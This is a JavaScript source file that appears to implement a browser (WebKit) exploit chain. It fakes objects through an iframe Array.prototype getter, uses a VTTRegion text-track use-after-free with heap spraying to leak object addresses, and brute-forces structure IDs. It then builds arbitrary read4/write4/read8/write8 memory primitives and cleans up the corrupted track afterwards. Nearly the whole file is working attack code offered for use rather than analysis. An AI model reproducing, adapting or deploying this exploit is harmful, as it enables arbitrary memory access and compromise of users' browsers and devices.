import {communicator} from "./communicator";
import {u64tof64} from "./utilities";

export function buildObject(lo, hi, callback) {
    communicator.log("Building object...");

    let a = [0, 4.243991582e-314, u64tof64(lo, hi), 3.5e-323, 3.5e-323];

    //TODO: put this in trash div instead of body if that even works
    let iframe = document.body.appendChild(document.createElement("iframe"));
    iframe.contentWindow.Array.prototype.__defineGetter__(100, function () {
        return 1;
    });

    let sub = iframe.contentWindow.Array.prototype.slice.call(a, 0, 4);
    iframe.remove();
    callback(sub[0]);
}

export function leakAddresses(objectA, objectB, objectC, callback) {
    communicator.log("leakinn");
    let validator = ~~(Math.random() * 0x10000);
    let vj = u64tof64(validator, 0);

    let vRegion = new VTTRegion();
    let video = document.createElement("video");
    video.appendChild(document.createElement("track"));
    video.textTracks[0].addRegion(vRegion);

    video = null;

    communicator.log("agc call");

    function agc() {
        let sprayCount = 0x10000;
        let array = [];

        for (let i = 0; i < sprayCount; ++i)
            array[i] = [objectA, objectB, objectC, vj, {}, {}, {}, {}, {}, {}, {}];

        let video = document.createElement("video");
        if (vRegion.track.kind.length > 16) {
            let tBuffer = new Uint16Array(512);
            let cBuffer = new Uint32Array(tBuffer.buffer);

            for (let i = 0; i < 512; ++i)
                tBuffer[i] = vRegion.track.kind.codePointAt(i);

            for (let i = 6; i < 512; ++i) {
                if (tBuffer[i << 1] === validator) {
                    i -= 6;

                    communicator.log("Found addresses");


                    for (let j = 0; j < 6; ++j)
                        communicator.log(cBuffer[i + j].toString(16));

                    let a = [cBuffer[i], cBuffer[i + 1]];
                    let b = [cBuffer[i + 2], cBuffer[i + 3]];
                    let c = [cBuffer[i + 4], cBuffer[i + 5]];

                    for (let i = 0; i < sprayCount; i++)
                        delete array[i];
                    array = null;

                    return callback(a, b, c, vRegion);
                }
            }
        }

        communicator.log("Failed to find the addresses...");
        tempFailed();
    }

    setTimeout(agc, 0);
}

export function tempFailed() {
    halt("Failed.. Press home button and try again")
}

export function halt(message) {
    while(1) alert(message);
}

export function executeExploit() {
    communicator.log("Hax inbound...");

    buildObject(0, 0, function (b) {
        buildObject(0x1337, 0x1, function (d) {
            let sId = 1;

            let magic = {
                'a': u64tof64(sId, 0x1602300 - 0x10000),
                'b': b,
                'c': u64tof64(1, 2),
                'd': d
            };

            d = 0;
            b = 0;

            let bStore = new ArrayBuffer(0x10 * 4);
            let rwMagic = new Uint32Array(bStore);

            let leakee = {'b': null};
            let leaker = {'a': leakee};

            leakAddresses(magic, rwMagic, leaker, function (magicAddress, rwAddress, leakerAddress, vRegion) {
                buildObject(rwAddress[0], rwAddress[1], function (c) {
                    magic.c = c;
                    c = 0;

                    buildObject(magicAddress[0] + 4 * 4, magicAddress[1], function (o) {
                        communicator.log("Inside object");

                        while (sId < 0x10000 && !(o instanceof Uint32Array))
                            magic.a = u64tof64(++sId, 0x1602300 - 0x10000);

                        if (!(o instanceof Uint32Array)) {
                            communicator.log("Could not find structure ID, something has gone wrong...");
                            halt("fuk");
                        }

                        alert("Found structure ID, nice?");

                        let save = [o[4], o[5], o[6]];

                        o[4] = leakerAddress[0];
                        o[5] = leakerAddress[1];
                        o[6] = 0x1337;

                        let va = new Uint32Array(bStore);
                        let vb = new Uint32Array(bStore);
                        leaker['a'] = leakee;
                        leakee['b'] = {'a': va};
                        let leakAddress = [rwMagic[4], rwMagic[5]];

                        o[4] = leakAddress[0];
                        o[5] = leakAddress[1];
                        let ta = [rwMagic[4], rwMagic[5]];
                        o[4] = ta[0];
                        o[5] = ta[1];
                        let addressA = [rwMagic[4], rwMagic[5]];

                        o[4] = leakAddress[0];
                        o[5] = leakAddress[1];
                        leakee['b'] = {'a': vb};
                        ta = [rwMagic[4], rwMagic[5]];
                        o[4] = ta[0];
                        o[5] = ta[1];
                        let addressB = [rwMagic[4], rwMagic[5]];

                        o[4] = addressA[0];
                        o[5] = addressA[1];
                        rwMagic[4] = addressB[0];
                        rwMagic[5] = addressB[1];

                        o[4] = save[0];
                        o[5] = save[1];
                        o[6] = save[2];
                        rwMagic = 0;
                        magic.a = 0;
                        magic.b = 0;
                        magic.c = 0;
                        magic.d = 0;
                        o = 0;

                        alert('Cleaning up');

                        function read4(address, offset) {
                            if (arguments.length === 1) { offset = 0; }

                            va[4] = address[0];
                            va[5] = address[1];
                            va[6] = 1 + offset;
                            return vb[offset];
                        }
                        function write4(value, address, offset) {
                            if (arguments.length === 2) { offset = 0; }

                            va[4] = address[0];
                            va[5] = address[1];
                            va[6] = 1 + offset;

                            vb[offset] = value;
                        }
                        function read8(address, offset) {
                            if (arguments.length === 1) { offset = 0; }
                            return [read4(address, offset), read4(address, offset + 1)];
                        }
                        function write8(value, address, offset) {
                            if (arguments.length === 2) { offset = 0; }
                            if (typeof (value) === 'number') { value = [value, 0]; }
                            write4(value[0], address, offset);
                            write4(value[1], address, offset + 1);
                        }
                        function getAddress(obj) {
                            leakee['b'] = {'a': obj};
                            return read8(read8(leakerAddress, 4), 4);
                        }

                        let video = document.createElement("video");
                        video.appendChild(document.createElement("track"));
                        let nta = read8(getAddress(video.textTracks[0]), 0x18 >> 2);
                        write8(nta, getAddress(vRegion.track), 0x18 >> 2);
                        leakee['b'] = {'a': null};

                        communicator.log("We're done :D");
                        halt("ayyyyyyyyyyyyyyyyyy");
                    })
                })
            })
        })
    })
}